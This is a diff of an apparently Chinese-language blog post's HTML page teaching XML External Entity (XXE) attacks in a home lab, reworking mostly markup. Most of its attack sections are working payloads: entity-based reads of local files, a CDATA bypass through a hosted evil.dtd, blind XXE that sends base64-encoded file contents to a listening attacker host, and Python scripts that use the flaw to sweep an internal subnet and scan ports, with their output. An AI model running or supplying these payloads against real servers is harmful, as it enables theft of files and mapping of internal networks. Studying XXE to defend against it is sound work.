@@ -437,14 +437,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.1k
+                    5.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    22 分
+                    24 分
                 </div>
                 
 
@@ -458,6 +458,9 @@
         </div>
         <hr class="clearfix">
 
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -479,8 +482,8 @@
 <p>这个 DTD 的作用就是去定义 XML 文档的合法构建模块，也就是说声明了 XML 的内容格式规范。</p>
 <p>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 .dtd 文件。</p>
 <p>下面是一个内部 DTD 的 XML 示例：</p>
-<pre><code>&lt;!--XML声明--&gt;
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;!--XML声明--&gt;
+&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
 &lt;!--DTD，文档类型声明--&gt;
 &lt;!DOCTYPE note [  #定义此文档是note类型
 &lt;!ELEMENT note (body)&gt;  #定义note元素有一个元素：&quot;body&quot;
@@ -489,21 +492,24 @@
 ]&gt;
 &lt;!--文档元素--&gt;                                                                         
 &lt;note&gt;
-&lt;body&gt;&amp;writer&lt;/body&gt;
-&lt;/note&gt;</code></pre>
+&lt;body&gt;&amp;writer&lt;&#x2F;body&gt;
+&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>上面第 7 行中定义了一个内部实体，在第 11 行中对上面定义的 writer 实体进行了引用，到时候输出的时候 &amp;writer 就会被 “hello word” 替换，通过上面的例子，我们可以简单的理解成一个实体其实就是一个变量。</p>
 <p>值得注意的是实体类型分为两种：内部实体和外部实体，上面是内部实体的例子，而今天的重点是外部实体，下面就来看看一个外部实体的例子。</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ELEMENT foo ANY &gt;  #定义元素为ANY，即可以接受任何元素。
-&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;
 &lt;root&gt;
-  &lt;body&gt;&amp;xxe&lt;/body&gt;  #定义一个外部实体
-&lt;/root&gt;</code></pre>
+  &lt;body&gt;&amp;xxe&lt;&#x2F;body&gt;  #定义一个外部实体
+&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>通过第 4 行的定义， 第 7 行的 &amp;xxe 就会对 c:/test.dtd 文件资源进行 SYSTEM 关键字的引用，这样对引用资源所做的任何更改都会在文档中自动更新。</p>
 <p>虽然这样做是方便了，但很多时候安全与方便总是矛与盾的关系。</p>
 <p>另外除了上面 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式，语法如下：</p>
-<pre><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用，但实际上实体远不止这一种，我们以上涉及的实体只是其中的一种，被称为通用实体。</p>
 <p>实体总共有四种，分别是：</p>
 <p>1、内置实体 (Built-in entities)</p>
@@ -515,21 +521,24 @@
 <p>估计不少人看到这里会感觉有点绕，但没关系，因为这不会影响你对下面内容的理解与复现，感兴趣的可以把上面的内容反复看几遍，或者看看文章尾部的参考文章。</p>
 </blockquote>
 <p>通用实体我们上面已经举了不少例子，下面就来看看参数实体：</p>
-<pre><code>&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; 
-&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; 
-%an-element; %remote-dtd;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; 
+&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; 
+%an-element; %remote-dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>在上面的代码示例中，可以看到实体名前多了一个 “%” ，在参数实体中使用 “% 实体名” (这里面的空格不能少) 定义，并且只能在 DTD 中使用 “% 实体名” 引用。</p>
 <p>另外和通用实体一样，参数实体也可以外部引用，同时只有在 DTD 文件中，参数实体的声明才能引用其他实体，还需要知道的是参数实体在 Blind XXE 中起到了至关重要的作用。</p>
 <h2 id="2、XML注入"><a href="#2、XML注入" class="headerlink" title="2、XML注入"></a>2、XML注入</h2><p>接下来我们来简单的了解一下XML注入，这部分很容易就能理解。</p>
 <p>在下面是一个普通的XML注入示例：</p>
-<pre><code>#注入前XML代码
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;
-&lt;USER role=&quot;admin&quot;&gt;用户输入位置&lt;/USER&gt;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">#注入前XML代码
+&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;
+&lt;USER role&#x3D;&quot;admin&quot;&gt;用户输入位置&lt;&#x2F;USER&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>当用户输入一些恶意代码，比如<code>User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2</code>，原XML代码就变成了下面的样子：</p>
-<pre><code>#注入后XML代码
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;
-&lt;USER role=&quot;admin&quot;&gt;User1&lt;/USER&gt;
-&lt;USER role=&quot;admin&quot;&gt;User2&lt;/USER&gt;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">#注入后XML代码
+&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;
+&lt;USER role&#x3D;&quot;admin&quot;&gt;User1&lt;&#x2F;USER&gt;
+&lt;USER role&#x3D;&quot;admin&quot;&gt;User2&lt;&#x2F;USER&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>可以看到通过XML语句的前后拼接， XML代码被插入了进去。</p>
 <p>对普通的 XML 注入，利用面比较狭窄，现实中也是比较鸡肋的存在，因此几乎用不到，如果有的话应该也是逻辑漏洞，这个时候XXE就出现了！</p>
 <p>注意，重点来了（敲黑板）</p>
@@ -542,23 +551,26 @@
 <blockquote>
 <p>注意：为了便于理解，笔者在部分地方添加了注释，如果读者想要复现文中内容，记得删除注释再使用，避免复现失败。</p>
 </blockquote>
-<h2 id="1、有回显读本地敏感文件-Normal-XXE"><a href="#1、有回显读本地敏感文件-Normal-XXE" class="headerlink" title="1、有回显读本地敏感文件 (Normal XXE)"></a>1、有回显读本地敏感文件 (Normal XXE)</h2><h3 id="xxe-test-php（在靶机）"><a href="#xxe-test-php（在靶机）" class="headerlink" title="xxe_test.php（在靶机）"></a>xxe_test.php（在靶机）</h3><pre><code>&lt;?php
+<h2 id="1、有回显读本地敏感文件-Normal-XXE"><a href="#1、有回显读本地敏感文件-Normal-XXE" class="headerlink" title="1、有回显读本地敏感文件 (Normal XXE)"></a>1、有回显读本地敏感文件 (Normal XXE)</h2><h3 id="xxe-test-php（在靶机）"><a href="#xxe-test-php（在靶机）" class="headerlink" title="xxe_test.php（在靶机）"></a>xxe_test.php（在靶机）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 
     libxml_disable_entity_loader (false);
-    $xmlfile = file_get_contents(&#39;php://input&#39;);
-    $dom = new DOMDocument();
+    $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
+    $dom &#x3D; new DOMDocument();
     $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
-    $creds = simplexml_import_dom($dom);
+    $creds &#x3D; simplexml_import_dom($dom);
     echo $creds;
-?&gt;</code></pre>
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>在C盘下新建一个flag.txt，内容我设置成了 “XXE Payload Executed Successfully!!!”。</p>
-<h3 id="payload（在本地）"><a href="#payload（在本地）" class="headerlink" title="payload（在本地）"></a>payload（在本地）</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+<h3 id="payload（在本地）"><a href="#payload（在本地）" class="headerlink" title="payload（在本地）"></a>payload（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE creds [  
-&lt;!ENTITY goodies SYSTEM &quot;file:///c:/flag.txt&quot;&gt; ]&gt; 
-&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre>
+&lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt; ]&gt; 
+&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>因为flag.txt文件中没有特殊符号，比如 &amp; &lt; &gt; ” ’ ，所以获取文件内容很顺利，如果把文件内容加点特殊符号，比如下面这个样子，在原来基础上加上左右尖括号：</p>
-<pre><code>&lt;XXE Payload Executed Successfully!!!&gt;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;XXE Payload Executed Successfully!!!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>此时再访问就是这个样子：</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>可以看到当被读取文件中含有特殊符号时，不但没有预期想要的结果，还返回了一堆错误，这个时候就需要使用CDATA了，下面是引用WIKI中关于CDATA的介绍。</p>
@@ -566,65 +578,71 @@
 <p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。<br>在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。例如”&lt;” 与 “&amp;” 分别表示 “&lt;” 与 “&amp;”。</p>
 </blockquote>
 <p>其实简单一点的来说也就是说，将脚本代码定义为 “CDATA” 后，CDATA 部分中的内容就会被解析器忽略，这个时候就可以读取文件了，那么接下来把Payload修改修改。</p>
-<h3 id="CDATA-Payload（在本地）"><a href="#CDATA-Payload（在本地）" class="headerlink" title="CDATA Payload（在本地）"></a>CDATA Payload（在本地）</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+<h3 id="CDATA-Payload（在本地）"><a href="#CDATA-Payload（在本地）" class="headerlink" title="CDATA Payload（在本地）"></a>CDATA Payload（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; 
 &lt;!DOCTYPE roottag [
 &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
-&lt;!ENTITY % goodies SYSTEM &quot;file:///c:/flag.txt&quot;&gt;  
+&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;  
 &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
-&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.10.30/evil.dtd&quot;&gt;  #本地IP
+&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.10.30&#x2F;evil.dtd&quot;&gt;  #本地IP
 %dtd; ]&gt; 
 
-&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre>
-<h3 id="evil-dtd（在本地）"><a href="#evil-dtd（在本地）" class="headerlink" title="evil.dtd（在本地）"></a>evil.dtd（在本地）</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
-&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre>
+&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="evil-dtd（在本地）"><a href="#evil-dtd（在本地）" class="headerlink" title="evil.dtd（在本地）"></a>evil.dtd（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; 
+&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>利用带有CDATA的Payload，可以看到特殊符号被成功绕过。</p>
 <p>不过在正常环境中，服务器上的XML就不是用来输出的，XML文件一般都是用于配置或者在一些极端条件下才能刚好实例化解析XML的类，因此在现实环境中利用这个漏洞就需要找到不依靠回显的方法。</p>
-<h2 id="2、无回显读取本地敏感文件-Blind-XXE"><a href="#2、无回显读取本地敏感文件-Blind-XXE" class="headerlink" title="2、无回显读取本地敏感文件 (Blind XXE)"></a>2、无回显读取本地敏感文件 (Blind XXE)</h2><h3 id="xxe-test-php（在靶机）-1"><a href="#xxe-test-php（在靶机）-1" class="headerlink" title="xxe_test.php（在靶机）"></a>xxe_test.php（在靶机）</h3><pre><code>&lt;?php
+<h2 id="2、无回显读取本地敏感文件-Blind-XXE"><a href="#2、无回显读取本地敏感文件-Blind-XXE" class="headerlink" title="2、无回显读取本地敏感文件 (Blind XXE)"></a>2、无回显读取本地敏感文件 (Blind XXE)</h2><h3 id="xxe-test-php（在靶机）-1"><a href="#xxe-test-php（在靶机）-1" class="headerlink" title="xxe_test.php（在靶机）"></a>xxe_test.php（在靶机）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 libxml_disable_entity_loader (false);
-$xmlfile = file_get_contents(&#39;php://input&#39;);
-$dom = new DOMDocument();
+$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);
+$dom &#x3D; new DOMDocument();
 $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
-?&gt;</code></pre>
-<h3 id="evil-dtd（在本地）-1"><a href="#evil-dtd（在本地）-1" class="headerlink" title="evil.dtd（在本地）"></a>evil.dtd（在本地）</h3><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/flag.txt&quot;&gt;
-&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://192.168.10.30:9999?p=%file;&#39;&gt;&quot;&gt;  #本地IP</code></pre>
-<h3 id="Payload（在本地）"><a href="#Payload（在本地）" class="headerlink" title="Payload（在本地）"></a>Payload（在本地）</h3><pre><code>&lt;!DOCTYPE convert [ 
-&lt;!ENTITY % remote SYSTEM &quot;http://192.168.10.30/evil.dtd&quot;&gt;  #本地IP
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="evil-dtd（在本地）-1"><a href="#evil-dtd（在本地）-1" class="headerlink" title="evil.dtd（在本地）"></a>evil.dtd（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.10.30:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;  #本地IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="Payload（在本地）"><a href="#Payload（在本地）" class="headerlink" title="Payload（在本地）"></a>Payload（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.10.30&#x2F;evil.dtd&quot;&gt;  #本地IP
 %remote;%int;%send;
-]&gt;</code></pre>
+]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>在evil.dtd中表示把返回数据传到本地的9999端口中，因此用nc监听9999端口就能看到靶机返回的数据，下图中红框标注的数据用base64解码便是靶机上 “c:/flag.txt” 的内容。</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>至于为什么返回数据是base64编码，也是为了不破环原来的XML语法，如果不编码则会报错。</p>
 <p>关于这个 Blind XXE 利用方式的更多脑洞可以参阅文章底部的参考文章。</p>
 <h2 id="3、HTTP内网主机探测"><a href="#3、HTTP内网主机探测" class="headerlink" title="3、HTTP内网主机探测"></a>3、HTTP内网主机探测</h2><p>话不多说，直接Show me the code，下面代码是我在前人的基础上做了一些修改，运行时注意代码为Python3代码。</p>
-<h3 id="Payload（在本地）-1"><a href="#Payload（在本地）-1" class="headerlink" title="Payload（在本地）"></a>Payload（在本地）</h3><pre><code>import requests
+<h3 id="Payload（在本地）-1"><a href="#Payload（在本地）-1" class="headerlink" title="Payload（在本地）"></a>Payload（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">import requests
 import base64
 
 def XXE(ip,string):
-    try:
-        xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;
-        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;
-        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;
-        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;
-        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;
-        xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;
-        x = requests.post(&#39;http://192.168.38.132/xxe_test.php&#39;, data=xml, headers=headers, timeout=5).text    #记得修改靶机地址
-        coded_string = x.split(&#39; &#39;)[-2]
-        print(&#39; [+]&#39;,ip,&#39;Successfully Found !!!&#39;)
-    except:    
-        print(&#39; [-]&#39;,ip,&#39;Error&#39;)
-        pass
+	try:
+		xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;
+		xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;
+		xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;
+		xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;
+		xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;&#x2F;stuff&gt;&quot;&quot;&quot;
+		xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;&#x2F;xml&gt;&quot;&quot;&quot;
+		x &#x3D; requests.post(&#39;http:&#x2F;&#x2F;192.168.38.132&#x2F;xxe_test.php&#39;, data&#x3D;xml, headers&#x3D;headers, timeout&#x3D;5).text	#记得修改靶机地址
+		coded_string &#x3D; x.split(&#39; &#39;)[-2]
+		print(&#39; [+]&#39;,ip,&#39;Successfully Found !!!&#39;)
+	except:	
+		print(&#39; [-]&#39;,ip,&#39;Error&#39;)
+		pass
 
-if __name__ == &#39;__main__&#39;:
-    headers = &#123;&#39;Content-Type&#39;:&#39;application/xml&#39;&#125;
-    for i in range(1,255):
-        ip = &#39;192.168.38.&#39; + str(i)     #记得修改IP段
-        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;
-        XXE(ip,string)</code></pre>
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	headers &#x3D; &#123;&#39;Content-Type&#39;:&#39;application&#x2F;xml&#39;&#125;
+	for i in range(1,255):
+		ip &#x3D; &#39;192.168.38.&#39; + str(i) 	#记得修改IP段
+		string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39;
+		XXE(ip,string)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>讲道理，代码运行着还是挺慢的，当时想着用多线程，但是发现用多线程速度相差也不大，所以多线程的代码就不放了，感兴趣的读者可以自己尝试着对代码进行优化，如果遇到什么问题也可以在我的公众号 “TeamsSix” 进行留言。</p>
 <p>另外如果读者想要复现的话，记得修改代码中的IP，靶机上的 xee_test.php 和之前Normal XXE利用的内容一致即可。</p>
 <p>上面的Payload运行起来就是这个样子：</p>
-<pre><code> ~# python3 inhostscan.py
+<pre class="line-numbers language-none"><code class="language-none"> ~# python3 inhostscan.py
  [+] 192.168.38.1 Successfully Found !!!
  [+] 192.168.38.2 Successfully Found !!!
  [-] 192.168.38.3 Error
@@ -637,26 +655,28 @@ if __name__ == &#39;__main__&#39;:
  [+] 192.168.38.132 Successfully Found !!!
  [-] 192.168.38.133 Error
  [-] 192.168.38.134 Error
-……内容太多，此处省略……</code></pre>
+……内容太多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>如果运行代码的时候报错提示没有安装模块，直接根据报错提示安装对应模块即可。</p>
 <h2 id="4、HTTP内网主机端口扫描"><a href="#4、HTTP内网主机端口扫描" class="headerlink" title="4、HTTP内网主机端口扫描"></a>4、HTTP内网主机端口扫描</h2><p>找到了内网的主机，还需要对其端口进行扫描，原理和上面一致，只不过IP固定，遍历端口，对于端口是否开放可以根据响应时间判断，下面放出Payload。</p>
-<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><pre><code>import requests
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><pre class="line-numbers language-none"><code class="language-none">import requests
 import base64
 
 def XXE(port):
-    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.38.129:&quot;&quot;&quot; + str(port) + &quot;&quot;&quot;/&quot; [&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ELEMENT data (#PCDATA)&gt; &quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;]&gt;&quot;&quot;&quot;
-    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;data&gt;7&lt;/data&gt;&quot;&quot;&quot;
-    r = requests.post(&#39;http://192.168.38.132/xxe_test.php&#39;, data=xml,timeout=5)    #记得修改靶机地址
-    print(port,r.elapsed.total_seconds())
+	xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &quot;&quot;&quot;
+	xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;192.168.38.129:&quot;&quot;&quot; + str(port) + &quot;&quot;&quot;&#x2F;&quot; [&quot;&quot;&quot;
+	xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ELEMENT data (#PCDATA)&gt; &quot;&quot;&quot;
+	xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;]&gt;&quot;&quot;&quot;
+	xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;data&gt;7&lt;&#x2F;data&gt;&quot;&quot;&quot;
+	r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;192.168.38.132&#x2F;xxe_test.php&#39;, data&#x3D;xml,timeout&#x3D;5)	#记得修改靶机地址
+	print(port,r.elapsed.total_seconds())
 
-if __name__ == &#39;__main__&#39;:
-    for i in range(1,65535):
-        XXE(i)</code></pre>
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	for i in range(1,65535):
+		XXE(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>Payload运行起来就是这个样子：</p>
-<pre><code>~# python portscan.py
+<pre class="line-numbers language-none"><code class="language-none">~# python portscan.py
 1 1.014703
 2 1.01378
 ……内容太多，此处省略……
@@ -667,13 +687,15 @@ if __name__ == &#39;__main__&#39;:
 110 1.033751
 111 0.008634
 112 1.038774
-……内容太多，此处省略……</code></pre>
+……内容太多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>可以很明显的发现 22 端口和 111 端口的响应时间远小于其他端口，根据此特征便可以判断 22、110 端口是开启的，不过也可以用Burp对端口进行爆破，Payload如下：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  
-&lt;!DOCTYPE data SYSTEM &quot;http://192.168.38.129:22/&quot; [  
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  
+&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;192.168.38.129:22&#x2F;&quot; [  
 &lt;!ELEMENT data (#PCDATA)&gt;  
 ]&gt;
-&lt;data&gt;7&lt;/data&gt;</code></pre>
+&lt;data&gt;7&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>只需要把上面的Payload以端口进行遍历即可，但我没有找到Burp爆破结果以响应时间排序的方法，所以我还是选择用Python。</p>
 <h1 id="0x02-XXE实例（MetInfo6-0-0-CMS）"><a href="#0x02-XXE实例（MetInfo6-0-0-CMS）" class="headerlink" title="0x02 XXE实例（MetInfo6.0.0 CMS）"></a>0x02 XXE实例（MetInfo6.0.0 CMS）</h1><h2 id="0、复现环境-1"><a href="#0、复现环境-1" class="headerlink" title="0、复现环境"></a>0、复现环境</h2><p>a、目标靶机</p>
 <p>IP：192.168.38.132</p>
